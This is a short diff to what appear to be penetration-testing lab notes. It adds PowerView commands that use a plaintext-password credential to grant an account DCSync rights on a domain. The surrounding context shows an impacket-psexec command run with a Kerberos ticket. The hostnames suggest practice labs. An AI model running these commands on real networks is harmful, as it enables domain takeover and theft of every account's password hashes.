@@ -79,3 +79,9 @@ export KRB5CCNAME=./Administrator.ccache
 impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.x.x
 ```
 
+# WriteDacl on DC
+```bash
+$SecPassword = ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('HTB.local\pwnt', $SecPassword)
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity pwnt -Rights DCSync
+```
